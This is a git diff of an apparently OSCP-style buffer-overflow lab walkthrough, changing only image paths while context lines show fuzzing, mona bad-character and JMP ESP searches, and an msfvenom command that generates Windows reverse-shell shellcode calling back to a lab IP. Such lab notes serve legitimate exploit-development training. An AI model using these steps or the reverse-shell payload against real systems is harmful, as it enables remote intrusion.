@@ -47,7 +47,7 @@ Place the following into the debugger window of Immunity:
 
 Running the fuzzer:
 
-<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>
 
 * <mark style="color:yellow;">We note that it crashed at 700 bytes</mark>
 
@@ -57,7 +57,7 @@ Running the fuzzer:
 
 Contents of exploit.py:
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (4).png" alt=""><figcaption></figcaption></figure>
 
 ### msf\_pattern\_create
 
@@ -226,7 +226,7 @@ Search for 23 in the payload and remove with CTRL + Shift + F
 !mona compare -f C:\mona\oscp\bytearray.bin -a 0198FA30
 ```
 
-<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>
 
 * We can see from the output that x3c was  a badchar and x3d was not one
 
@@ -304,7 +304,7 @@ We can quickly find the jump point by using Mona:
 !mona jmp -r esp -cpb “\x00\x23\x3c\x83\xba”
 ```
 
-<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 * We find 9 pointers
 * This means that any of the addresses can be used as the retn value in the exploit
@@ -335,7 +335,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.111.208 LPORT=4444 EXITFUNC=thr
 2. Open the exploit and add the shellcode to the payload section
 3. <mark style="color:yellow;">Make sure that the EXITFUNC consists of the bad chars and not the RETN value</mark>
 
-<figure><img src="../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
 ## NOP Sledding
 
